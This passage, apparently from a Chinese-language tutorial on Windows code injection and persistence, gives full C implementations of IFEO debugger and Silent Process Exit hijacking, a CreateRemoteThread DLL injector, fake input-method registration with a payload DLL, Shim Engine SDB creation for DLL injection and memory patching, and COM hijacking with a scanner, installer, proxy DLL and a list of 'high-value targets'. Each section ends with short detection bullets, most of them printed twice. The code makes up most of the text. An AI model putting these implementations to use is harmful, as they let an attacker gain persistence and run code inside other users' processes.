L\"%llu\", policy);\n            result = (RegSetValueExW(hKey, L\"MitigationOptions\", 0, REG_SZ,\n                (BYTE*)mitigation, (DWORD)((wcslen(mitigation) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);\nbreak;\n        }\n\ncase IFEO_SILENT_EXIT: {\n// 方法5：静默退出监控\n// 当进程退出时触发 WerFault 或自定义监控程序\n            DWORD reportingMode = 1;  // LAUNCH_MONITORPROCESS\n            RegSetValueExW(hKey, L\"ReportingMode\", 0, REG_DWORD, (BYTE*)&amp;reportingMode, sizeof(DWORD));\n            result = (RegSetValueExW(hKey, L\"MonitorProcess\", 0, REG_SZ,\n                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);\n\n// 还需要在 SilentProcessExit 子键配置\n            WCHAR silentKey[512];\n            swprintf_s(silentKey, 512, L\"%s\\\\%s\\\\SilentProcessExit\", IFEO_BASE, targetExe);\n            HKEY hSilent;\nif (RegCreateKeyExW(HKEY_LOCAL_MACHINE, silentKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &amp;hSilent, NULL) == ERROR_SUCCESS) {\n                RegSetValueExW(hSilent, L\"MonitorProcess\", 0, REG_SZ, (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR)));\n                RegSetValueExW(hSilent, L\"ReportingMode\", 0, REG_DWORD, (BYTE*)&amp;reportingMode, sizeof(DWORD));\n                RegCloseKey(hSilent);\n            }\nbreak;\n        }\n    }\n\n    RegCloseKey(hKey);\nreturn result;\n}\n\nBOOL RemoveIfeo(const WCHAR* targetExe) {\n    WCHAR keyPath[512];\n    swprintf_s(keyPath, 512, L\"%s\\\\%s\", IFEO_BASE, targetExe);\nreturn (RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath) == ERROR_SUCCESS);\n}\n\n// Debugger 代理程序（作为 payload 使用）\n// 当系统通过 IFEO 启动此程序时，原始 exe 路径在 argv[1]\n#ifdef BUILD_DEBUGGER_PROXY\nint wmain(int argc, WCHAR* argv[]) {\nif (argc &lt; 2) return 1;\n\n// argv[1] = 原始目标程序路径\n// 可以在此注入 DLL 后再启动目标程序\n\n    STARTUPINFOW si = { sizeof(si) };\n    PROCESS_INFORMATION pi = {0};\n\n// 注入方式：CREATE_SUSPENDED -&gt; 注入 DLL -&gt; ResumeThread\nif (CreateProcessW(argv[1], GetCommandLineW(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {\n// 在这里执行 DLL 注入\n        WCHAR dllToInject[] = L\"C:\\\\payload.dll\";\n        SIZE_T dllPathSize = (wcslen(dllToInject) + 1) * sizeof(WCHAR);\n\n        LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);\n        WriteProcessMemory(pi.hProcess, remoteBuf, dllToInject, dllPathSize, NULL);\n\n        HMODULE hKernel32 = GetModuleHandleW(L\"kernel32.dll\");\n        LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, \"LoadLibraryW\");\n\n        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pLoadLibrary, remoteBuf, 0, NULL);\n        WaitForSingleObject(hThread, 5000);\n        CloseHandle(hThread);\n        VirtualFreeEx(pi.hProcess, remoteBuf, 0, MEM_RELEASE);\n\n        ResumeThread(pi.hThread);\n        CloseHandle(pi.hThread);\n        CloseHandle(pi.hProcess);\n    }\n\nreturn 0;\n}\n#endif\n\nint wmain(int argc, WCHAR* argv[]) {\n// 示例：对 notepad.exe 安装 IFEO Debugger 劫持\n    InstallIfeo(L\"notepad.exe\", L\"C:\\\\debugger_proxy.exe\", IFEO_DEBUGGER);\n    wprintf(L\"IFEO installed for notepad.exe\\n\");\n\n// 示例：对 target.exe 安装 Verifier DLL 注入\n    InstallIfeo(L\"target.exe\", L\"payload.dll\", IFEO_VERIFIER);\n    wprintf(L\"Verifier DLL injection configured for target.exe\\n\");\n\nreturn 0;\n}\n</code></pre><h3 id=\"section-87\">检测方法</h3><ul><li><p>监控 IFEO 注册表键的创建和修改（Sysmon Event ID 12/13）</p></li><li><p>检查所有 IFEO 子键是否有 Debugger、VerifierDlls、MonitorProcess 等可疑值</p></li><li><p>应用白名单：仅允许已知调试器（如 vsjitdebugger.exe）作为 Debugger 值</p></li></ul><h3 id=\"section-88\">检测方法</h3><ul><li>监控 IFEO 注册表键的创建和修改（Sysmon Event ID 12/13）</li><li>检查所有 IFEO 子键是否有 <code>Debugger</code>、<code>VerifierDlls</code>、<code>MonitorProcess</code> 等可疑值</li><li>应用白名单：仅允许已知调试器（如 <code>vsjitdebugger.exe</code>）作为 Debugger 值</li></ul><hr><h2 id=\"section-89\">1.13 IME 注入（输入法注入）</h2><h3 id=\"section-90\">技术定位</h3><p><strong>历史攻击向量</strong>，现代环境罕见。通过注册伪造输入法，在切换输入法时将 DLL 加载到 GUI 进程。</p><h3 id=\"section-91\">原理</h3><p>Windows 输入法（IME）通过注册表 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts</code> 注册，每个输入法对应一个 DLL。当用户切换到该输入法时，系统会将对应的 IME DLL 加载到当前焦点进程中。通过注册一个伪造的输入法 DLL，可以实现对任意 GUI 进程的 DLL 注入。</p><p>更高级的方式是使用 Text Services Framework（TSF），通过 COM 接口注册 Text Input Processor，实现更隐蔽的注入。</p><h3 id=\"section-92\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;imm.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(lib, \"imm32.lib\")\n#pragma comment(lib, \"advapi32.lib\")\n#pragma comment(lib, \"user32.lib\")\n\n#define FAKE_IME_KEY L\"E0200804\"  // 自定义键盘布局 ID\n#define FAKE_IME_NAME L\"Fake Research IME\"\n\n// === 安装器代码 ===\n\nBOOL RegisterFakeIme(const WCHAR* imeDllPath) {\n    WCHAR keyPath[256];\n    swprintf_s(keyPath, 256, L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\%s\", FAKE_IME_KEY);\n\n    HKEY hKey;\n    DWORD disposition;\n    LONG ret = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &amp;hKey, &amp;disposition);\nif (ret != ERROR_SUCCESS) return FALSE;\n\n// 设置输入法文件名（只需要文件名，不需要完整路径，DLL 需放在 System32）\n    WCHAR* dllName = wcsrchr(imeDllPath, L'\\\\');\n    dllName = dllName ? dllName + 1 : (WCHAR*)imeDllPath;\n\n    RegSetValueExW(hKey, L\"Ime File\", 0, REG_SZ, (BYTE*)dllName, (DWORD)((wcslen(dllName) + 1) * sizeof(WCHAR)));\n    RegSetValueExW(hKey, L\"Layout Text\", 0, REG_SZ, (BYTE*)FAKE_IME_NAME, sizeof(FAKE_IME_NAME));\n\n    WCHAR layoutFile[] = L\"kbdus.dll\";\n    RegSetValueExW(hKey, L\"Layout File\", 0, REG_SZ, (BYTE*)layoutFile, sizeof(layoutFile));\n\n    RegCloseKey(hKey);\n\n// 复制 DLL 到 System32\n    WCHAR sysDir[MAX_PATH];\n    GetSystemDirectoryW(sysDir, MAX_PATH);\n    WCHAR destPath[MAX_PATH];\n    swprintf_s(destPath, MAX_PATH, L\"%s\\\\%s\", sysDir, dllName);\n    CopyFileW(imeDllPath, destPath, FALSE);\n\nreturn TRUE;\n}\n\nBOOL ActivateFakeIme(DWORD targetTid) {\n// 加载输入法到指定线程\n    HKL hkl = LoadKeyboardLayoutW(FAKE_IME_KEY, KLF_ACTIVATE);\nif (!hkl) return FALSE;\n\nif (targetTid != 0) {\n// 向目标线程发送输入法切换消息\n        PostThreadMessageW(targetTid, WM_INPUTLANGCHANGEREQUEST, 0, (LPARAM)hkl);\n    }\n\nreturn TRUE;\n}\n\nBOOL InjectViaIme(DWORD targetPid) {\n// 找到目标进程的主线程\n    HWND hWnd = NULL;\n    DWORD tid = 0;\n\n// 枚举目标进程的窗口\ntypedef struct { DWORD pid; HWND hwnd; } FIND_WND_DATA;\n    FIND_WND_DATA data = { targetPid, NULL };\n\n    EnumWindows([](HWND hwnd, LPARAM lp) -&gt; BOOL {\n        FIND_WND_DATA* d = (FIND_WND_DATA*)lp;\n        DWORD pid;\n        GetWindowThreadProcessId(hwnd, &amp;pid);\nif (pid == d-&gt;pid &amp;&amp; IsWindowVisible(hwnd)) {\n            d-&gt;hwnd = hwnd;\nreturn FALSE;\n        }\nreturn TRUE;\n    }, (LPARAM)&amp;data);\n\nif (!data.hwnd) return FALSE;\n\n    tid = GetWindowThreadProcessId(data.hwnd, NULL);\n\n// 激活伪造输入法到目标线程\n    HKL hkl = LoadKeyboardLayoutW(FAKE_IME_KEY, KLF_ACTIVATE | KLF_REORDER);\nif (!hkl) return FALSE;\n\n// 通过 WM_INPUTLANGCHANGEREQUEST 触发目标进程加载 IME DLL\n    PostMessageW(data.hwnd, WM_INPUTLANGCHANGEREQUEST, 0, (LPARAM)hkl);\n\nreturn TRUE;\n}\n\nvoid UnregisterFakeIme() {\n    UnloadKeyboardLayout(LoadKeyboardLayoutW(FAKE_IME_KEY, 0));\n\n    WCHAR keyPath[256];\n    swprintf_s(keyPath, 256, L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\%s\", FAKE_IME_KEY);\n    RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);\n}\n\n// === IME DLL 代码 ===\n// 编译为 fakeime.dll，需导出 IME 标准接口\n\n#ifdef BUILD_IME_DLL\n\nstatic BOOL g_payloadExecuted = FALSE;\n\nvoid ImePayload() {\nif (g_payloadExecuted) return;\n    g_payloadExecuted = TRUE;\n\n// 检查是否在目标进程中\nchar exePath[MAX_PATH];\n    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n// 执行实际 payload：内存 Hook、信息窃取等\n// 此处 IME DLL 已被系统加载到目标进程中\n\n// 示例：记录按键到共享内存\n    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, \"Global\\\\ImeHookShared\");\nif (hMap) {\nchar* pBuf = (char*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 4096);\nif (pBuf) {\n// 写入当前进程信息\n            sprintf_s(pBuf, 4096, \"Injected into PID: %lu EXE: %s\", GetCurrentProcessId(), exePath);\n            UnmapViewOfFile(pBuf);\n        }\n    }\n}\n\n// IME 标准导出函数\n__declspec(dllexport) BOOL WINAPI ImeInquire(LPIMEINFO lpIMEInfo, LPWSTR lpszUIClass, LPCWSTR lpszOption) {\n    ImePayload();\n    lpIMEInfo-&gt;dwPrivateDataSize = 0;\n    lpIMEInfo-&gt;fdwProperty = IME_PROP_UNICODE | IME_PROP_AT_CARET;\n    lpIMEInfo-&gt;fdwConversionCaps = 0;\n    lpIMEInfo-&gt;fdwSentenceCaps = 0;\n    lpIMEInfo-&gt;fdwUICaps = 0;\n    lpIMEInfo-&gt;fdwSCSCaps = 0;\n    lpIMEInfo-&gt;fdwSelectCaps = 0;\n    wcscpy_s(lpszUIClass, 64, L\"FakeIMEUI\");\nreturn TRUE;\n}\n\n__declspec(dllexport) BOOL WINAPI ImeConfigure(HKL hKL, HWND hWnd, DWORD dwMode, LPVOID lpData) { return FALSE; }\n__declspec(dllexport) DWORD WINAPI ImeConversionList(HIMC hIMC, LPCWSTR lpSrc, LPCANDIDATELIST lpDst, DWORD dwBufLen, UINT uFlag) { return 0; }\n__declspec(dllexport) BOOL WINAPI ImeDestroy(UINT uForce) { return TRUE; }\n__declspec(dllexport) LRESULT WINAPI ImeEscape(HIMC hIMC, UINT uSubFunc, LPVOID lpData) { return 0; }\n__declspec(dllexport) BOOL WINAPI ImeProcessKey(HIMC hIMC, UINT uVirKey, LPARAM lParam, CONST LPBYTE lpbKeyState) { return FALSE; }\n__declspec(dllexport) BOOL WINAPI ImeSelect(HIMC hIMC, BOOL fSelect) { return TRUE; }\n__declspec(dllexport) BOOL WINAPI ImeSetActiveContext(HIMC hIMC, BOOL fFlag) { return TRUE; }\n__declspec(dllexport) UINT WINAPI ImeToAsciiEx(UINT uVirKey, UINT uScanCode, CONST LPBYTE lpbKeyState, LPDWORD lpdwTransBuf, UINT fuState, HIMC hIMC) { return 0; }\n__declspec(dllexport) BOOL WINAPI NotifyIME(HIMC hIMC, DWORD dwAction, DWORD dwIndex, DWORD dwValue) { return FALSE; }\n__declspec(dllexport) BOOL WINAPI ImeSetCompositionString(HIMC hIMC, DWORD dwIndex, LPCVOID lpComp, DWORD dwCompLen, LPCVOID lpRead, DWORD dwReadLen) { return FALSE; }\n__declspec(dllexport) BOOL WINAPI ImeRegisterWord(LPCWSTR lpszReading, DWORD dwStyle, LPCWSTR lpszString) { return FALSE; }\n__declspec(dllexport) BOOL WINAPI ImeUnregisterWord(LPCWSTR lpszReading, DWORD dwStyle, LPCWSTR lpszString) { return FALSE; }\n__declspec(dllexport) UINT WINAPI ImeGetRegisterWordStyle(UINT nItem, LPSTYLEBUFW lpStyleBuf) { return 0; }\n__declspec(dllexport) UINT WINAPI ImeEnumRegisterWord(REGISTERWORDENUMPROCW lpfnEnumProc, LPCWSTR lpszReading, DWORD dwStyle, LPCWSTR lpszString, LPVOID lpData) { return 0; }\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\nif (reason == DLL_PROCESS_ATTACH) {\n        DisableThreadLibraryCalls(hModule);\n        ImePayload();\n    }\nreturn TRUE;\n}\n#endif\n</code></pre><h3 id=\"section-93\">检测方法</h3><ul><li><p>枚举 Keyboard Layouts 注册表键，对比系统默认输入法列表</p></li><li><p>检查 IME DLL 是否有有效的数字签名</p></li><li><p>监控 imm32.dll 的 ImmInstallIME / LoadKeyboardLayout 调用</p></li><li><p>TSF 注入检测：枚举 COM 注册的 Text Input Processor</p></li></ul><h3 id=\"section-94\">检测方法</h3><ul><li>枚举 Keyboard Layouts 注册表键，对比系统默认输入法列表</li><li>检查 IME DLL 是否有有效的数字签名</li><li>监控 <code>imm32.dll</code> 的 <code>ImmInstallIME</code> / <code>LoadKeyboardLayout</code> 调用</li><li>TSF 注入检测：枚举 COM 注册的 Text Input Processor</li></ul><hr><h2 id=\"section-95\">1.14 Shim Engine Hook（应用兼容性引擎）</h2><h3 id=\"section-96\">技术定位</h3><p><strong>微软官方兼容性框架</strong>，可被滥用做 DLL 注入或内存补丁。通过 SDB 数据库文件匹配目标进程，在 <code>ntdll!LdrpInitShimEngine</code> 阶段自动应用。</p><h3 id=\"section-97\">原理</h3><p>Windows Application Compatibility Framework 允许通过 SDB 文件对应用程序做内存补丁。可重定向 API 调用、修改内存代码（InMemoryPatch）、注入 DLL（InjectDll shim）。系统在进程创建时由 <code>ntdll!LdrpInitShimEngine</code> 自动应用匹配的 Shim。</p><h3 id=\"section-98\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\ntypedef HANDLE (WINAPI *SdbCreateDatabase_t)(LPCWSTR path, DWORD type);\ntypedef void   (WINAPI *SdbCloseDatabaseWrite_t)(HANDLE db);\ntypedef DWORD  (WINAPI *SdbBeginWriteListTag_t)(HANDLE db, DWORD tag);\ntypedef BOOL   (WINAPI *SdbEndWriteListTag_t)(HANDLE db, DWORD tagId);\ntypedef BOOL   (WINAPI *SdbWriteStringTag_t)(HANDLE db, DWORD tag, LPCWSTR value);\ntypedef BOOL   (WINAPI *SdbWriteDWORDTag_t)(HANDLE db, DWORD tag, DWORD value);\ntypedef BOOL   (WINAPI *SdbWriteBinaryTag_t)(HANDLE db, DWORD tag, BYTE* data, DWORD size);\n\n#define TAG_DATABASE     0x7001\n#define TAG_LIBRARY      0x7002\n#define TAG_EXE          0x7007\n#define TAG_SHIM_REF     0x7008\n#define TAG_PATCH_REF    0x7009\n#define TAG_PATCH        0x700A\n#define TAG_NAME         0x6001\n#define TAG_APP_NAME     0x6006\n#define TAG_DLLFILE      0x6003\n#define TAG_OS_PLATFORM  0x4023\n#define TAG_PATCH_BITS   0x9002\n#define TAG_COMMAND_LINE 0x6008\n\nBOOL CreateInjectDllSdb(const WCHAR* sdbPath, const WCHAR* targetExe, const WCHAR* dllToInject) {\n    HMODULE hApphelp = LoadLibraryW(L\"apphelp.dll\");\nif (!hApphelp) return FALSE;\n\n    SdbCreateDatabase_t pCreate = (SdbCreateDatabase_t)GetProcAddress(hApphelp, \"SdbCreateDatabase\");\n    SdbCloseDatabaseWrite_t pClose = (SdbCloseDatabaseWrite_t)GetProcAddress(hApphelp, \"SdbCloseDatabaseWrite\");\n    SdbBeginWriteListTag_t pBeginList = (SdbBeginWriteListTag_t)GetProcAddress(hApphelp, \"SdbBeginWriteListTag\");\n    SdbEndWriteListTag_t pEndList = (SdbEndWriteListTag_t)GetProcAddress(hApphelp, \"SdbEndWriteListTag\");\n    SdbWriteStringTag_t pWriteString = (SdbWriteStringTag_t)GetProcAddress(hApphelp, \"SdbWriteStringTag\");\n    SdbWriteDWORDTag_t pWriteDword = (SdbWriteDWORDTag_t)GetProcAddress(hApphelp, \"SdbWriteDWORDTag\");\n\nif (!pCreate || !pClose || !pBeginList || !pEndList || !pWriteString) {\n        FreeLibrary(hApphelp);\nreturn FALSE;\n    }\n\n    HANDLE hSdb = pCreate(sdbPath, 2);\nif (!hSdb || hSdb == INVALID_HANDLE_VALUE) { FreeLibrary(hApphelp); return FALSE; }\n\n    DWORD dbTag = pBeginList(hSdb, TAG_DATABASE);\n    pWriteString(hSdb, TAG_NAME, L\"CustomShimDB\");\n    pWriteDword(hSdb, TAG_OS_PLATFORM, 1);\n\n    DWORD libTag = pBeginList(hSdb, TAG_LIBRARY);\n    DWORD shimTag = pBeginList(hSdb, 0x700A);\n    pWriteString(hSdb, TAG_NAME, L\"InjectDll\");\n    pWriteString(hSdb, TAG_DLLFILE, L\"InjectDll.dll\");\n    pEndList(hSdb, shimTag);\n    pEndList(hSdb, libTag);\n\n    DWORD exeTag = pBeginList(hSdb, TAG_EXE);\n    pWriteString(hSdb, TAG_NAME, targetExe);\n    pWriteString(hSdb, TAG_APP_NAME, L\"TargetApp\");\n    DWORD refTag = pBeginList(hSdb, TAG_SHIM_REF);\n    pWriteString(hSdb, TAG_NAME, L\"InjectDll\");\n    pWriteString(hSdb, TAG_COMMAND_LINE, dllToInject);\n    pEndList(hSdb, refTag);\n    pEndList(hSdb, exeTag);\n    pEndList(hSdb, dbTag);\n\n    pClose(hSdb);\n    FreeLibrary(hApphelp);\nreturn TRUE;\n}\n\nBOOL InstallSdb(const WCHAR* sdbPath) {\n    HMODULE hApphelp = LoadLibraryW(L\"apphelp.dll\");\nif (!hApphelp) return FALSE;\ntypedef BOOL (WINAPI *SdbInstallDB_t)(LPCWSTR, DWORD);\n    SdbInstallDB_t p = (SdbInstallDB_t)GetProcAddress(hApphelp, \"SdbInstallDB\");\nBOOL r = p ? p(sdbPath, 0) : FALSE;\n    FreeLibrary(hApphelp);\nreturn r;\n}\n\ntypedef struct { DWORD rva; BYTE* patchBytes; DWORD patchSize; } MEMORY_PATCH;\n\nBOOL CreateMemPatchSdb(const WCHAR* sdbPath, const WCHAR* targetExe, MEMORY_PATCH* patches, DWORD count) {\n    HMODULE hApphelp = LoadLibraryW(L\"apphelp.dll\");\nif (!hApphelp) return FALSE;\n    SdbCreateDatabase_t pCreate = (SdbCreateDatabase_t)GetProcAddress(hApphelp, \"SdbCreateDatabase\");\n    SdbCloseDatabaseWrite_t pClose = (SdbCloseDatabaseWrite_t)GetProcAddress(hApphelp, \"SdbCloseDatabaseWrite\");\n    SdbBeginWriteListTag_t pBegin = (SdbBeginWriteListTag_t)GetProcAddress(hApphelp, \"SdbBeginWriteListTag\");\n    SdbEndWriteListTag_t pEnd = (SdbEndWriteListTag_t)GetProcAddress(hApphelp, \"SdbEndWriteListTag\");\n    SdbWriteStringTag_t pStr = (SdbWriteStringTag_t)GetProcAddress(hApphelp, \"SdbWriteStringTag\");\n    SdbWriteBinaryTag_t pBin = (SdbWriteBinaryTag_t)GetProcAddress(hApphelp, \"SdbWriteBinaryTag\");\n\n    HANDLE hSdb = pCreate(sdbPath, 2);\nif (!hSdb) { FreeLibrary(hApphelp); return FALSE; }\n\n    DWORD db = pBegin(hSdb, TAG_DATABASE);\n    pStr(hSdb, TAG_NAME, L\"MemPatchDB\");\n    DWORD lib = pBegin(hSdb, TAG_LIBRARY);\nfor (DWORD i = 0; i &lt; count; i++) {\n        DWORD pt = pBegin(hSdb, TAG_PATCH);\n        WCHAR nm[32]; swprintf_s(nm, 32, L\"P%d\", i);\n        pStr(hSdb, TAG_NAME, nm);\n        DWORD sz = 8 + patches[i].patchSize;\n        BYTE* bits = (BYTE*)calloc(1, sz);\n        *(DWORD*)bits = patches[i].rva;\n        *(DWORD*)(bits+4) = patches[i].patchSize;\n        memcpy(bits+8, patches[i].patchBytes, patches[i].patchSize);\n        pBin(hSdb, TAG_PATCH_BITS, bits, sz);\n        free(bits);\n        pEnd(hSdb, pt);\n    }\n    pEnd(hSdb, lib);\n    DWORD exe = pBegin(hSdb, TAG_EXE);\n    pStr(hSdb, TAG_NAME, targetExe);\nfor (DWORD i = 0; i &lt; count; i++) {\n        DWORD ref = pBegin(hSdb, TAG_PATCH_REF);\n        WCHAR nm[32]; swprintf_s(nm, 32, L\"P%d\", i);\n        pStr(hSdb, TAG_NAME, nm);\n        pEnd(hSdb, ref);\n    }\n    pEnd(hSdb, exe);\n    pEnd(hSdb, db);\n    pClose(hSdb);\n    FreeLibrary(hApphelp);\nreturn TRUE;\n}\n\nint wmain() {\n    CreateInjectDllSdb(L\"C:\\\\inject.sdb\", L\"target.exe\", L\"C:\\\\payload.dll\");\n    InstallSdb(L\"C:\\\\inject.sdb\");\n    BYTE nops[] = {0x90, 0x90, 0x90, 0x90, 0x90};\n    MEMORY_PATCH p = {0x1234, nops, 5};\n    CreateMemPatchSdb(L\"C:\\\\patch.sdb\", L\"target.exe\", &amp;p, 1);\nreturn 0;\n}\n</code></pre><h3 id=\"section-99\">检测方法</h3><ul><li><p>枚举 <code>HKLM\\...\\AppCompatFlags\\InstalledSDB</code></p></li><li><p>检查 <code>%windir%\\AppPatch\\Custom</code> 目录</p></li><li><p>监控 sdbinst.exe 调用</p></li><li><p>sdb2xml 反编译</p></li></ul><h3 id=\"section-100\">检测方法</h3><ul><li>枚举 <code>HKLM\\...\\AppCompatFlags\\InstalledSDB</code></li><li>检查 <code>%windir%\\AppPatch\\Custom</code> 目录</li><li>监控 <code>sdbinst.exe</code> 调用</li><li><code>sdb2xml</code> 反编译 SDB 查看注入/补丁内容</li></ul><hr><h2 id=\"section-101\">1.15 COM Hijacking（COM 对象劫持）</h2><h3 id=\"section-102\">技术定位</h3><p><strong>常见无管理员持久化技术</strong>。利用 COM 注册表 <code>HKCU</code> 优先于 <code>HKLM</code> 的特性，劫持 CLSID 指向恶意 DLL。无需管理员权限。</p><h3 id=\"section-103\">原理</h3><p>Windows COM 通过注册表 CLSID 查找组件 DLL 路径。<code>HKCU</code> 优先于 <code>HKLM</code>，因此无需管理员权限即可劫持。系统中存在大量 Abandoned COM 对象（DLL 已删除但注册表未清理），可直接植入 DLL 利用。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    A[\"应用程序 CoCreateInstance\"] --&gt; B[\"查询 HKCU\\\\Classes\\\\CLSID\"]\n    B --&gt; C{\"HKCU 有覆盖?\"}\n    C --&gt;|是| D[\"加载 HKCU 中的恶意 DLL\"]\n    C --&gt;|否| E[\"回退到 HKLM\\\\Classes\\\\CLSID\"]\n    E --&gt; F[\"加载合法 DLL\"]\n</code></pre><h3 id=\"section-104\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(lib, \"advapi32.lib\")\n#pragma comment(lib, \"ole32.lib\")\n\ntypedef struct { WCHAR clsid[64]; WCHAR dll[MAX_PATH]; BOOL abandoned; } COM_TARGET;\n\nDWORD ScanAbandonedCom(COM_TARGET* targets, DWORD max) {\n    DWORD found = 0;\n    HKEY hRoot;\nif (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L\"SOFTWARE\\\\Classes\\\\CLSID\", 0, KEY_READ, &amp;hRoot)) return 0;\n    DWORD idx = 0; WCHAR clsid[64]; DWORD sz;\nwhile (found &lt; max) {\n        sz = 64;\nif (RegEnumKeyExW(hRoot, idx++, clsid, &amp;sz, NULL, NULL, NULL, NULL)) break;\n        WCHAR sub[128]; swprintf_s(sub, 128, L\"%s\\\\InprocServer32\", clsid);\n        HKEY hSub;\nif (!RegOpenKeyExW(hRoot, sub, 0, KEY_READ, &amp;hSub)) {\n            WCHAR dll[MAX_PATH] = {0}; DWORD ds = sizeof(dll);\nif (!RegQueryValueExW(hSub, NULL, NULL, NULL, (BYTE*)dll, &amp;ds)) {\n                WCHAR exp[MAX_PATH]; ExpandEnvironmentStringsW(dll, exp, MAX_PATH);\nif (GetFileAttributesW(exp) == INVALID_FILE_ATTRIBUTES) {\nwcscpy_s(targets[found].clsid, 64, clsid);\nwcscpy_s(targets[found].dll, MAX_PATH, exp);\n                    targets[found].abandoned = TRUE;\n                    found++;\n                }\n            }\nRegCloseKey(hSub);\n        }\n    }\nRegCloseKey(hRoot);\nreturn found;\n}\n\nBOOL InstallComHijack(const WCHAR* clsid, const WCHAR* malDll) {\n    WCHAR key[256];\nswprintf_s(key, 256, L\"SOFTWARE\\\\Classes\\\\CLSID\\\\%s\\\\InprocServer32\", clsid);\n    HKEY hk;\nif (RegCreateKeyExW(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_SET_VALUE, NULL, &amp;hk, NULL)) return FALSE;\nRegSetValueExW(hk, NULL, 0, REG_SZ, (BYTE*)malDll, (DWORD)((wcslen(malDll)+1)*2));\n    WCHAR tm[] = L\"Both\";\nRegSetValueExW(hk, L\"ThreadingModel\", 0, REG_SZ, (BYTE*)tm, sizeof(tm));\nRegCloseKey(hk);\nreturn TRUE;\n}\n\nBOOL RemoveComHijack(const WCHAR* clsid) {\n    WCHAR key[256];\nswprintf_s(key, 256, L\"SOFTWARE\\\\Classes\\\\CLSID\\\\%s\", clsid);\nreturn !RegDeleteTreeW(HKEY_CURRENT_USER, key);\n}\n\n// 代理 DLL 模板：转发原始 COM 接口，同时执行 payload\n#ifdef BUILD_COM_PROXY\nstatic HMODULE g_hOrig = NULL;\ntypedef HRESULT (WINAPI *DllGetClassObject_t)(REFCLSID, REFIID, LPVOID*);\n\nvoid ComPayload() {\n// DLL 已加载到目标进程（explorer.exe / svchost.exe 等）\n// 可执行任意操作：Hook API、读取进程内存、建立 C2 通信等\nchar exe[MAX_PATH];\nGetModuleFileNameA(NULL, exe, MAX_PATH);\n// 根据宿主进程决定行为\n}\n\n__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {\nif (!g_hOrig) g_hOrig = LoadLibraryW(L\"C:\\\\Windows\\\\System32\\\\original_com.dll\");\nif (g_hOrig) {\n        DllGetClassObject_t pOrig = (DllGetClassObject_t)GetProcAddress(g_hOrig, \"DllGetClassObject\");\nif (pOrig) return pOrig(rclsid, riid, ppv);\n    }\nreturn 0x80040111L; // CLASS_E_CLASSNOTAVAILABLE\n}\n\n__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) { return S_FALSE; }\n__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) { return S_OK; }\n__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void) { return S_OK; }\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\nif (reason == DLL_PROCESS_ATTACH) {\nDisableThreadLibraryCalls(hModule);\nComPayload();\n    } else if (reason == DLL_PROCESS_DETACH) {\nif (g_hOrig) FreeLibrary(g_hOrig);\n    }\nreturn TRUE;\n}\n#endif\n\n// 高价值劫持目标\nvoid PrintTargets() {\nconst WCHAR* interesting[][2] = {\n        {L\"{BCDE0395-E52F-467C-8E3D-C4579291692E}\", L\"MMDeviceEnumerator\"},\n        {L\"{4590F811-1D3A-11D0-891F-00AA004B2E24}\", L\"WbemLocator (WMI)\"},\n        {L\"{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}\", L\"TaskScheduler\"},\n        {L\"{0002DF01-0000-0000-C000-000000000046}\", L\"InternetExplorer\"},\n    };\nfor (int i = 0; i &lt; 4; i++)\nwprintf(L\"  %s -&gt; %s\\n\", interesting[i][0], interesting[i][1]);\n}\n\nint wmain() {\n    COM_TARGET t[100]; DWORD n = ScanAbandonedCom(t, 100);\nwprintf(L\"Found %lu abandoned COM objects:\\n\", n);\nfor (DWORD i = 0; i &lt; n &amp;&amp; i &lt; 15; i++)\nwprintf(L\"  %s -&gt; %s\\n\", t[i].clsid, t[i].dll);\nwprintf(L\"\\nHigh-value targets:\\n\");\nPrintTargets();\nreturn 0;\n}\n</code></pre><h3 id=\"section-105\">检测方法</h3><ul><li><p>对比 HKCU vs HKLM CLSID 键发现覆盖</p></li><li><p>InprocServer32 DLL 签名验证</p></li><li><p>Sysmon Event 12/13 监控 CLSID 修改</p></li><li><p>定期扫描 Abandoned COM Keys</p></li><li><p>使用 OleView 或 COM Hijack 检测工具审计</p></li></ul><h3 id=\"section-106\">检测方法</h3><ul><li>对比 HKCU vs HKLM CLSID 键发现覆盖</li><li>InprocServer32 DLL 签名验证</li><li>Sysmon Event 12/13 监控 CLSID 修改</li><li>定期扫描 Abandoned COM Keys</li><li>使用 OleView 或 COM Hijack 